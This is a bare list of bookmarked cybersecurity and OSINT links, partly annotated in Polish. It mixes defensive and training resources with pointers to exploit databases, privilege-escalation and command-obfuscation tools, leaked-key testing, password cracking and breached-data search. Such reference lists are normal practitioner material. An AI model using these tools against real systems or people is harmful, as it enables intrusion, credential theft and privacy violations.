* https://www.hackthebox.com/
* https://phonebook.cz/ - interesujące informacje o domenach, mailach i URL
* https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a/
* https://github.com/cedowens/C2-JARM
* https://www.suncalc.org/#/27.6936,-97.5195,3/2024.11.15/12:32/1/3
* https://www.freeradius.org/
* https://www.cloudflare.com/pl-pl/learning/access-management/what-is-mutual-tls/
* http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html
* https://www.dualcomm.com/products/usb-powered-10-100-1000base-t-network-tap
* https://builtwith.com/
* https://gpsjam.org/
* https://telehack.com/
* https://wigle.net/
* https://whois.domaintools.com/
* https://www.iplocation.net/
* https://eternallybored.org/
* https://www.threatminer.org/
* https://amiunique.org/
* https://sekurak.pl/hostowe-systemy-wykrywania-intruzow-hidshostowe-systemy-wykrywania-intruzow/
* https://cert.pl/posts/2016/09/necurs-hybrydowy-botnet-spamowy/
* https://visualping.io/
* https://tineye.com/
* https://www.geoportal.gov.pl/
* https://pastebin.com/
* https://intelx.io/
* https://rejestr.io/
* https://romek.info/ut/urzskarb.php
* https://www.cgsecurity.org/
* https://www.ssllabs.com/ssltest
* https://workbook.securityboat.net/
* https://kompose.io/
* https://computingforgeeks.com/how-to-provision-vms-on-kvm-with-terraform/
* https://command-not-found.com/
* https://www.exploit-db.com/
* https://github.com/telekom-security/tpotce?tab=readme-ov-file#system-requirements
* Lynx
* https://github.com/tats/w3m
* https://github.com/browsh-org/browsh
* https://ssl-config.mozilla.org/
* https://caniuse.com/
* https://weleakinfo.io/
* https://www.sonarsource.com/lp/knowledge/languages/
* https://pswalia2u.medium.com/ssh-tunneling-port-forwarding-pivoting-socks-proxy-85fb7129912d
* https://github.com/twelvesec/port-forwarding
* https://github.com/The-Z-Labs/linux-exploit-suggester
* https://sekurak.pl/monitoring-bezpieczenstwa-linux-integracja-auditd-ossec-czesc-i/
* https://sekurak.pl/chroot-w-praktyce/
* https://wave.webaim.org/extension/
* https://www.first.org/cvss/calculator/3.0
* https://github.com/streaak/keyhacks
* https://publicwww.com/
* https://github.com/ptoomey3/evilarc
* https://github.com/shieldfy/API-Security-Checklist
* https://github.com/sensepost/objection
* https://github.com/SwiftOnSecurity/sysmon-config
* https://canarytokens.org/nest/
* SecLists
* https://www.ventoy.net/en/index.html
* https://argfuscator.net/
* https://www.atomicredteam.io/atomic-red-team
* https://github.com/center-for-threat-informed-defense/adversary_emulation_library
* https://sekurak.pl/wprowadzenie-do-sysinternals-pstools-psexec/
* https://github.com/topics/cybersecurity-projects
* https://github.com/topics/cybersecurity
* https://www.nitttrchd.ac.in/imee/Labmanuals/Password%20Cracking%20of%20Windows%20Operating%20System.pdf